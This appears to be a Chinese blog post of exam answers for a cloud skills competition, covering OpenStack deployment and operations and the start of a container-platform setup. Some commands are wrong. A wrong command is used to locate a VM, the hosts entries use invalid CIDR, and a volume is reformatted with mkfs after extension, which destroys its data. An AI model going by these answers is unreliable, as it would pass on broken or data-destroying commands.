<h2 id="任务二-Openstack-搭建任务"><a href="#任务二-Openstack-搭建任务" class="headerlink" title="任务二 Openstack 搭建任务"></a>任务二 Openstack 搭建任务</h2><h3 id="1-修改变量文件"><a href="#1-修改变量文件" class="headerlink" title="1.修改变量文件"></a>1.修改变量文件</h3><p>在控制节点和计算节点上分别安装 iaas-xiandian 软件包，修改配置脚本文件中基本变量（配置脚本文件为&#x2F;etc&#x2F;xiandian&#x2F;openrc.sh）。修改完成后使用命令生效该变量文件，然后执行 echo $INTERFACE_IP 命令。 </p>
<p>请将命令和返回结果提交到答题框。【0.5 分】</p>
<p><strong>在controller节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y iaas-xiandian</span><br><span class="line"></span><br><span class="line">vi /etc/xiandian/openrc.sh</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">tips: :%s/#// 去除#</span></span><br><span class="line">        :%s/PASS=/PASS=000000</span><br><span class="line">        </span><br><span class="line">source /etc/xiandian/openrc.sh</span><br><span class="line">echo $INTERFACE_IP</span><br></pre></td></tr></table></figure>

<p><strong>在comopute节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y iaas-xiandian</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录到controller</span></span><br><span class="line">scp /etc/xiandian/openrc.sh root@172.17.31.20:/etc/xiandian/openrc.sh</span><br><span class="line"></span><br><span class="line">修改INTERFACE_IP即可</span><br><span class="line">source /etc/xiandian/openrc.sh</span><br><span class="line">echo $INTERFACE_IP</span><br></pre></td></tr></table></figure>

<h3 id="2-搭建数据库组件"><a href="#2-搭建数据库组件" class="headerlink" title="2.搭建数据库组件"></a>2.搭建数据库组件</h3><p>使用提供的脚本框架 iaas-install-mysql.sh 填充脚本，在 controller 节点上安装 mariadb、mencached、rabbitmq 等服务并完成相关配置。完成后修改配置文件将 mencached 最大连接数修改为 2048。 </p>
<p>请将修改后的配置文件提交到答题框。【1 分】</p>
<p><strong>在controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-install-mysql.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#若配置文件忘记位置，可以通过查看iaas-install-mysql.sh查看位置</span></span><br><span class="line">vi /etc/sysconfig/memcached</span><br><span class="line">MAXCONN=<span class="string">&quot;2048&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-搭建认证服务组件"><a href="#3-搭建认证服务组件" class="headerlink" title="3.搭建认证服务组件"></a>3.搭建认证服务组件</h3><p>使用提供的脚本框架 iaas-install-keystone.sh 填充脚本，在 controlle r 节点上安装 keystone 服务并完成相关配置。完成后使用 openstack 命令请求 一个 token。 </p>
<p>请将以上命令和返回结果提交到答题框。【1 分】 </p>
<p><strong>在controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-install-keystone.sh</span><br><span class="line">openstack token issue</span><br></pre></td></tr></table></figure>

<h3 id="4-搭建镜像服务组件"><a href="#4-搭建镜像服务组件" class="headerlink" title="4.搭建镜像服务组件"></a>4.搭建镜像服务组件</h3><p>使用提供的脚本框架 iaas-install-glance.sh 填充脚本，在 controller 节点上安装 glance 服务并完成相关配置。完成后请将 cirros-0.3.4-x86_64-disk.img 上传到控制节点的 &#x2F;root 目录下，然后使用 openstack 命令将该镜像上传到 openstack 平台镜像命名为 cirros。</p>
<p>请将镜像上传的操作命令和返回结果提交到答题框。【1 分】</p>
<p><strong>在controller节点</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iaas-install-glance.sh</span><br><span class="line">openstack image create --disk-format qcow2 --container-format bare  --shared cirros &lt;/root/cirros-0.3.4-x86_64-disk.img </span><br></pre></td></tr></table></figure>

<h3 id="5-搭建计算服务组件"><a href="#5-搭建计算服务组件" class="headerlink" title="5.搭建计算服务组件"></a>5.搭建计算服务组件</h3><p>使用提供的脚本框架 iaas-install-nova-controller.sh 和 iaas-install-nova-compute.sh 填充脚本，在 controller 和 compute 节点上安装 nova 服务并完成配置。完成后请将控制节点的计算资源也加入集群。然后使用 openstack 命令列出能提供计算资源的节点。</p>
<p>将列出计算资源的命令和返回结果提交到答题框。【1.5 分】</p>
<p><strong>在controller节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-install-nova-controller.sh</span><br></pre></td></tr></table></figure>

<p><strong>在compute节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-install-nova-compute.sh</span><br></pre></td></tr></table></figure>

<p><strong>controller：</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将控制节点的计算资源也加入集群</span></span><br><span class="line">把compute节点的名称和IP都改成controller节点的名称和IP</span><br><span class="line">vi /etc/iaas-openstack/openrc.sh</span><br><span class="line">HOST_IP_NODE=172.17.31.10</span><br><span class="line">HOST_NAME_NODE=controller</span><br><span class="line"></span><br><span class="line">iaas-install-nova-compute.sh</span><br><span class="line"><span class="comment">#建议执行完毕后改回</span></span><br></pre></td></tr></table></figure>

<p><strong>修改nova配置</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/nova/nova.conf</span><br><span class="line">[libvirt]</span><br><span class="line">virt_type=qemu		##在[libvirt]下添加此行即可</span><br></pre></td></tr></table></figure>

<h3 id="6-搭建网络组件并初始化网络"><a href="#6-搭建网络组件并初始化网络" class="headerlink" title="6.搭建网络组件并初始化网络"></a>6.搭建网络组件并初始化网络</h3><p>使用提供 的脚本框架 iaas-install-neutron-controller.sh 和 iaas-install-neutron-compute.sh，填充脚本，在 controller 和 compute 节点上安装 neutron 服务并完成配置。创建云主机外部网络 ext-net，子网为 ext-subnet，云主机浮动 IP 可用网段为 172.18.x.100<del>172.18.x.200，网关为 172.18.x.1。创建云主机内部网络 int-net1，子网为 int-subnet1，云主机子网 IP 可用网段为 10.0.0.100</del>10.0.0.200，网关为 10.0.0.1；创建云主机内部网络 int-net2，子网为 int-subnet2，云主机子网 IP 可用网段为 10.0.1.100 ~ 10.0.1.200，网关为 10.0.1.1。添加名为 ext-router 的路由器，添加网关在 ext-net 网络，添加内部端口到 int-net1 网络，完成内部网络 int-net1 和外部网络的连通。 </p>
<p>请使用 openstack 命令完成以下任务，完成后将命令和返回结果提交到答题框。【4 分】</p>
<p><strong>controller</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-install-neutron-controller.sh</span><br></pre></td></tr></table></figure>

<p><strong>compute</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iaas-insta ll-neutron-compute.sh</span><br></pre></td></tr></table></figure>

<p><strong>创建网络(controller)</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建外部网络</span></span><br><span class="line">openstack network create --external  --provider-physical-network provider --provider-network-type flat   ext-net</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">给外部网络绑定ip</span></span><br><span class="line">openstack subnet create  --network ext-net --subnet-range 172.18.31.0/24 --gateway 172.18.31.1 --allocation-pool start=172.18.31.100,end=172.18.31.200 --dhcp  ext-subnet</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建int-net1（云主机子网 IP 可用网段为 10.0.0.100~10.0.0.200，网关为 10.0.0.1）</span></span><br><span class="line">openstack network create --internal int-net1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建int-net1网段int-subnet1</span></span><br><span class="line">openstack subnet create --subnet-range 10.0.0.0/24  --gateway 10.0.0.1 --dhcp --allocation-pool start=10.0.0.100,end=10.0.0.200  --network int-net1 int-subnet1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建int-net2（云主机子网 IP 可用网段为 10.0.1.100 ~ 10.0.1.200，网关为 10.0.1.1）</span></span><br><span class="line">openstack network create --internal int-net2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建int-net2网段</span></span><br><span class="line">openstack subnet create --subnet-range 10.0.1.0/24  --gateway 10.0.1.1 --dhcp --allocation-pool start=10.0.1.100,end=10.0.1.200  --network int-net2 int-subnet2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加路由ext-router</span></span><br><span class="line">openstack router create ext-router</span><br><span class="line">openstack router set --enable --enable-snat --external-gateway ext-net ext-router</span><br><span class="line">openstack router add subnet ext-router int-subnet1</span><br></pre></td></tr></table></figure>



<h3 id="7-搭建图形化界面"><a href="#7-搭建图形化界面" class="headerlink" title="7.搭建图形化界面"></a>7.搭建图形化界面</h3><p>使用提供的脚本框架 iaas-install-dashboard.sh，填充脚本，在 controller 节点上安装 dashboard 服务并完成相关配置。 </p>
<p>请使用 curl 指令获取 dashboard 首页信息，将获取到的首页信息提交到答 题框。【1 分】 </p>
<p><strong>controller</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iaas-install-dashboard.sh</span><br><span class="line"> curl -L http://192.168.100.10/dashboard</span><br></pre></td></tr></table></figure>

<h2 id="任务-3-OpenStack-运维任务"><a href="#任务-3-OpenStack-运维任务" class="headerlink" title="任务 3 OpenStack 运维任务"></a><strong>任务 3 OpenStack 运维任务</strong></h2><h3 id="1-用户管理"><a href="#1-用户管理" class="headerlink" title="1.用户管理"></a>1.用户管理</h3><p>在 keystone 中创建用户 testuser，密码为 password。创建好之后，使用命令修改 testuser 密码为 000000，并查看 testuser 的详细信息。添加将该 用户添加到 admin 项目并赋予普通用户权限，完成后测试登录。 </p>
<p>使用 testuser 用登录系统完成后截图并提交到答题框。【1 分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openstack user create  testuser  --password password --domain demo</span><br><span class="line">openstack user set testuser --password 000000</span><br><span class="line">openstack user show testuser</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| Field               | Value                            |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">| domain_id           | ff1e0a9d790046209bd22307ca565a8e |</span><br><span class="line">| enabled             | True                             |</span><br><span class="line">| id                  | 79ab69675e6a454a83fc1f13bd884315 |</span><br><span class="line">| name                | testuser                         |</span><br><span class="line">| options             | &#123;&#125;                               |</span><br><span class="line">| password_expires_at | None                             |</span><br><span class="line">+---------------------+----------------------------------+</span><br><span class="line">openstack role add user --user testuser --project admin </span><br></pre></td></tr></table></figure>

<h3 id="2-服务查询"><a href="#2-服务查询" class="headerlink" title="2.服务查询"></a>2.服务查询</h3><p>使用命令列出服务目录和端点，查看 glance 服务的端点。将以上命令和返 </p>
<p>回结果提交到答题框。【0.5 分】</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">openstack service list <span class="comment">#查看服务目录</span></span><br><span class="line">openstack endpoint list <span class="comment">#查看服务端点</span></span><br><span class="line">openstack endpoint list | grep glance</span><br></pre></td></tr></table></figure>

<h3 id="3-镜像管理"><a href="#3-镜像管理" class="headerlink" title="3.镜像管理"></a>3.镜像管理</h3><p>登录 controller 节点，使用 glance 相关命令，上传镜像，源使用 CentOS_6.5_x86_64_XD.qcow2，名字为 testone，然后使用 openstack 命令修改这个镜像名改为 examimage，然后给这个镜像打一个标签，标签名字为 lastone 改完后使用 openstack 命令查看镜像列表。</p>
<p>将以上命令和返回结果提交到答题框。【2 分】</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">glance image-create --name testone --disk-format qcow2 --container bare --file /opt/images/CentOS_6.5_x86_64_XD.qcow2 </span><br><span class="line"></span><br><span class="line">openstack image set --name examiage --tag lastone testone</span><br></pre></td></tr></table></figure>

<h3 id="4-后端配置文件管理"><a href="#4-后端配置文件管理" class="headerlink" title="4.后端配置文件管理"></a>4.后端配置文件管理</h3><p>进入到glance 后端存储目录中，使用 qemu 命令查看任意的一个镜像信息。使用 du 命令查看 nova 主配置文件大小。 </p>
<p>将以上命令和返回结果提交到答题框。【0.5 分】 </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/lib/glance/images/</span><br><span class="line"><span class="comment">#qemu-img info &lt;文件名称&gt;</span></span><br><span class="line">qemu-img info 6ca6669e-cc71-4f51-becf-b5db53c212f1</span><br></pre></td></tr></table></figure>

<h3 id="5-存储服务管理"><a href="#5-存储服务管理" class="headerlink" title="5.存储服务管理"></a>5.存储服务管理</h3><p>创建一个卷类型，然后创建一块带这个卷类型标识的云硬盘，查询该云硬盘的详细信息。将该云硬盘挂载到虚拟机中，将该云硬盘格式化为 xfs。创建一个文件文件名为工位号内容为工位号，然后将该云硬盘卸载，使用 openstack 命令将该云硬盘修改为只读状态，再次挂载后查看是否存在原始文件，然后再次向该云硬盘中创建一个文件，文件名为工位号_02。 </p>
<p>将返回结果及解题过程提交到答题框。【2 分】 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建卷类型</span><br><span class="line"> openstack volume type create lvm1</span><br><span class="line">#创建卷</span><br><span class="line"> openstack volume create --size 10 --type lvm1 juan1</span><br><span class="line">#查看卷详细信息</span><br><span class="line">  openstack volume show juan1 </span><br><span class="line">#将云硬盘挂载到虚拟机中</span><br><span class="line">openstack server add volume centos juan1</span><br><span class="line">#将云硬盘格式化为xfs</span><br><span class="line">mkfs.xfs /dev/vdb</span><br><span class="line">#挂在创建文件</span><br><span class="line">mount /dev/vdb /mnt</span><br><span class="line">touch /mnt/31</span><br><span class="line">umount /mnt</span><br><span class="line">#云硬盘卸载</span><br><span class="line">openstack server remove volume centos juan1</span><br><span class="line">#设置为只读</span><br><span class="line">openstack volume set juan1 --read-only</span><br><span class="line">#将云硬盘挂载到虚拟机中</span><br><span class="line">openstack server add volume centos juan1</span><br><span class="line">#挂在创建文件</span><br><span class="line">mount /dev/vdb /mnt</span><br><span class="line">touch /mnt/31_02</span><br><span class="line">显示不成功</span><br></pre></td></tr></table></figure>



<h3 id="6-存储服务管理"><a href="#6-存储服务管理" class="headerlink" title="6.存储服务管理"></a>6.存储服务管理</h3><p>使用命令创建一个 5GB 的云硬盘，名称为 disk-2，将云硬盘挂载到云虚拟机内，然后格式化为 ext4，挂载到虚拟机的 &#x2F;mnt&#x2F; 目录下，使用 df -h 将命令和返回信息提交到答题框。将该云硬盘使用命令卸载，使用命令将该云硬盘扩容到 10GB，使用命令将云硬盘挂载到云主机上，将命令及返回信息提交到答题框。进入云主机使用命令扩容文件系统，扩容后再次挂载到 &#x2F;mnt&#x2F;使用 df -hT 命令并将命令和返回信息提交到答题框。【2 分】。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建云硬盘</span></span><br><span class="line">openstack volume create --size 5 &#x27;disk-2&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载</span></span><br><span class="line">openstack server add volume centos disk-2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式化</span></span><br><span class="line">mkfs.ext4 /dev/vdb</span><br><span class="line">mount /dev/vdb /mnt</span><br><span class="line">df-h</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">umount /mnt</span><br><span class="line">openstack server remove volume centos disk-2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">扩容</span></span><br><span class="line">openstack volume set --size 10 &#x27;disk-2&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载</span></span><br><span class="line">openstack server add volume centos disk-2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式化</span></span><br><span class="line">mkfs.ext4 /dev/vdb</span><br><span class="line">mount /dev/vdb /mnt</span><br><span class="line">df -hT</span><br></pre></td></tr></table></figure>

<h3 id="7-对象存储管理"><a href="#7-对象存储管理" class="headerlink" title="7.对象存储管理"></a>7.对象存储管理</h3><p>使用 swift 相关命令，创建一个容器，然后往这个容器中上传一个文件（文件可以自行创建），上传完毕后，使用命令查看容器。 </p>
<p>将以上命令和返回结果提交到答题框。【0.5 分】</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swift post container</span><br><span class="line">swift upload  container /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">swift list container</span><br></pre></td></tr></table></figure>

<h3 id="8-安全组管理"><a href="#8-安全组管理" class="headerlink" title="8.安全组管理"></a>8.安全组管理</h3><p>使用命令创建名称为 group_web 的安全组该安全组的描述为工位号，为该安全组添加一条规则允许任意 ip 地址访问 web 流量，完成后查看该安全组的详细信息。</p>
<p>将以上命令和返回结果提交到答题框。【2 分】 </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openstack security group create group_web --description 31</span><br><span class="line">openstack security group rule create group_web --protocol tcp --dst-port 80:80 --remote-ip 0.0.0.0/0</span><br><span class="line">openstack security group rule create group_web --protocol tcp --dst-port 443:443 --remote-ip 0.0.0.0/0</span><br><span class="line">openstack security group show group_web</span><br></pre></td></tr></table></figure>

<h3 id="9-网络管理"><a href="#9-网络管理" class="headerlink" title="9.网络管理"></a>9.网络管理</h3><p>使用命令将int-net1网络设置为共享，然后查看int-net1网络的详细信息。 </p>
<p>将命令和返回信息提交到答题框。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openstack network set --share  int-net1</span><br></pre></td></tr></table></figure>

<h3 id="10-网络管理"><a href="#10-网络管理" class="headerlink" title="10.网络管理"></a>10.网络管理</h3><p>使用 dashboard 界面使用 centos7.5 镜像创建一台云主机，云主机命名为 test-01，使用命令查看浮动 IP 地址池，使用命令创建一个浮动 IP，然后将浮动IP 绑定到云主机上。</p>
<p>将命令和返回信息提交到答题框。【1 分】 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openstack floating ip create ext-net</span><br><span class="line">openstack server add floating ip test-01 172.18.31.118</span><br></pre></td></tr></table></figure>

<h3 id="11-虚拟机管理"><a href="#11-虚拟机管理" class="headerlink" title="11.虚拟机管理"></a>11.虚拟机管理</h3><p>使用 opentack 命令利用 centos7.5 镜像创建一台云主机，连接 int-net1 网 络，云主机名称为 test-02。创建成功后使用命令查看云主机详细信息，确定该云主机是处于计算节点还是控制节点。如果云主机处于控制节点上请将其冷迁移到计算节点，如果如果云主机处于计算节点上请将其冷迁移到控制节点。 </p>
<p>本题全部流程请使用命令完成，请将全部命令和结果粘贴到答题框。【3 分】</p>
<p><strong>一、冷迁移</strong><br><strong>1、在控制节点关闭虚拟机</strong><br><strong>2、在计算节点找到实例位置（&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances）</strong><br><strong>3、将计算节点的需要转移的实例文件copy到目标主机的相同位置下。</strong><br><strong>4、到目标主机，赋予实例权限</strong><br><strong>5、登录数据库更改mysql的host，node字段为新的物理主机名。</strong><br><strong>6、重启目标主机的nova-compute服务</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看虚拟机在哪个节点</span></span><br><span class="line">openstack service show test-02</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">停止准备迁移的主机</span></span><br><span class="line">openstack server stop test-02</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">迁移</span></span><br><span class="line">cd /var/lib/nova/instances/</span><br><span class="line">scp 1f03d8ae-1190-49b5-9590-c7bee2912f69/ root@172.17.31.10:/var/lib/nova/instances/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录并赋予权限</span></span><br><span class="line">cd  /var/lib/nova/instances/</span><br><span class="line">chown nova:nova 1f03d8ae-1190-49b5-9590-c7bee2912f69/ -R</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">登录mysql(根据虚拟机位置更改，登录数据库更改MySQL中的host、node字段为新的物理主机名字)</span></span><br><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">use nova;</span></span><br><span class="line"> update instances set host=&#x27;controller&#x27;, node=&#x27;controller&#x27; where uuid=&#x27;1f03d8ae-1190-49b5-9590-c7bee2912f69&#x27;;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启节点</span></span><br><span class="line">systemctl restart openstack-nova-compute.service</span><br></pre></td></tr></table></figure>



<h1 id="B-场次题目：容器的编排与运维"><a href="#B-场次题目：容器的编排与运维" class="headerlink" title="B 场次题目：容器的编排与运维"></a><strong>B 场次题目：容器的编排与运维</strong></h1><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220916112215714.png" alt="image-20220916112215714"></p>
<h2 id="任务-1-容器云平台环境初始化"><a href="#任务-1-容器云平台环境初始化" class="headerlink" title="任务 1 容器云平台环境初始化"></a><strong>任务 1 容器云平台环境初始化</strong></h2><h3 id="1-容器云平台的初始化"><a href="#1-容器云平台的初始化" class="headerlink" title="1.容器云平台的初始化"></a>1.容器云平台的初始化</h3><p>根据表 2 的 IP 地址规划，创建云服务器，镜像使用CentOS_7.5_x86_64_XD.qcow，确保网络正常通信。按照表 2 置主机名节点并关闭 swap，同时永久关闭 selinux 以及防火墙,并修改 hosts 映射。 </p>
<p>请将 master 节点 hosts 文件内容提交到答题框。【1 分】</p>
<p><strong>Master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname master</span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">   SELINUX=disabled</span><br><span class="line">swapoff -a</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld </span><br><span class="line">vi /etc/hosts</span><br><span class="line">10.0.0.1/24 master</span><br><span class="line">10.0.0.2/24 node1</span><br><span class="line">10.0.0.3/24 node2</span><br><span class="line">10.0.0.4/24 harbor</span><br></pre></td></tr></table></figure>

<p><strong>Node1</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname node1</span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">   SELINUX=disabled</span><br><span class="line">swapoff -a</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Node2</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname node2</span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">   SELINUX=disabled</span><br><span class="line">swapoff -a</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Harbor</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hostnamectl set-hostname habor</span><br><span class="line">setenforce 0</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">   SELINUX=disabled</span><br><span class="line">swapoff -a</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-Yum源数据的持久化挂载"><a href="#2-Yum源数据的持久化挂载" class="headerlink" title="2.Yum源数据的持久化挂载"></a>2.Yum源数据的持久化挂载</h3><p>将提供的 CentOS-7-x86_64-DVD-1804.iso 和 chinaskills_cloud_paas.iso 光盘镜像上传到 master 节点 &#x2F;root 目录下，然后在 &#x2F;opt 目录下使用命令创建&#x2F;centos 目录和 &#x2F;paas 目录，并将镜像文件 CentOS-7-x86_64-DVD-1804.iso 挂载到&#x2F;centos 目录下，将镜像文件 chinaskills_cloud_paas.iso 挂载到 &#x2F;paas目录下。请设置永久开机自动挂载，并将设置的永久开机自动挂载的文件内容提交到+答题框。【1 分】</p>
<p><strong>Master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /opt/centos</span><br><span class="line">mkdir /opt/paas</span><br><span class="line">mount CentOS-7-x86_64-DVD-1804.iso  /opt/centos</span><br><span class="line">mount chinaskills_cloud_paas.iso /opt/paas</span><br><span class="line"></span><br><span class="line">vi /etc/fstab</span><br><span class="line">/root/CentOS-7-x86_64-DVD-1804.iso  /opt/centos iso9660 defaults 0 0</span><br><span class="line">/root/chinaskills_cloud_paas.iso /opt/paas iso9660 defaults 0 0</span><br><span class="line"></span><br><span class="line">mount -a</span><br></pre></td></tr></table></figure>

<h3 id="3-Yum源的编写"><a href="#3-Yum源的编写" class="headerlink" title="3.Yum源的编写"></a>3.Yum源的编写</h3><p>为 master 节点设置本地 yum 源，yum 源文件名为 centos.repo，安装 ftp 服务，将 ftp 仓库设置为 &#x2F;opt&#x2F;，为其他节点配置 ftp 源，yum 源文件名称为 ftp.repo，其中 ftp 服务器地址为 master 节点 IP。 </p>
<p>请将其它节点的 yum 源文件内容提交到答题框。【1 分】</p>
<p>Master</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/centos.repo</span><br><span class="line"></span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=file:///opt/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装vsftpd服务</span></span><br><span class="line">yum install -y vsftpd</span><br><span class="line">vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  anon_root=/opt/</span><br><span class="line">systemctl start vsftpd</span><br><span class="line">systemctl enable vsftpd</span><br><span class="line"></span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">/usr/sbin/iptables-save</span><br></pre></td></tr></table></figure>

<p>其他节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv /etc/yum.repos.d/* /etc/yum</span><br><span class="line">vi /etc/yum.repos.d/ftp.repo</span><br><span class="line"></span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://10.0.0.1/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[k8s]</span><br><span class="line">name=k8s</span><br><span class="line">baseurl=ftp://10.0.0.1/paas/kubernetes-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">/usr/sbin/iptables-save</span><br></pre></td></tr></table></figure>

<h3 id="4-设置时间同步服务器"><a href="#4-设置时间同步服务器" class="headerlink" title="4.设置时间同步服务器"></a>4.设置时间同步服务器</h3><p>在 master 节点上部署 chrony 服务器，允许其他节点同步时间，启动服务并设置为开机启动；在其他节点上指定 master 节点为上游 NTP 服务器，重启服务并设为开机启动。</p>
<p>请在 master 节点上使用 chronyc 命令同步控制节点的系统时间。【1 分】 </p>
<p><strong>Master</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/chrony.conf</span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server master iburst</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Record the rate at <span class="built_in">which</span> the system clock gains/losses <span class="keyword">time</span>.</span></span><br><span class="line">driftfile /var/lib/chrony/drift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow the system clock to be stepped <span class="keyword">in</span> the first three updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> its offset is larger than 1 second.</span></span><br><span class="line">makestep 1.0 3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable kernel synchronization of the real-time clock (RTC).</span></span><br><span class="line">rtcsync</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable hardware timestamping on all interfaces that support it.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">hwtimestamp *</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Increase the minimum number of selectable sources required to adjust</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the system clock.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">minsources 2</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow NTP client access from <span class="built_in">local</span> network.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">allow 192.168.0.0/16</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Serve <span class="keyword">time</span> even <span class="keyword">if</span> not synchronized to a <span class="keyword">time</span> 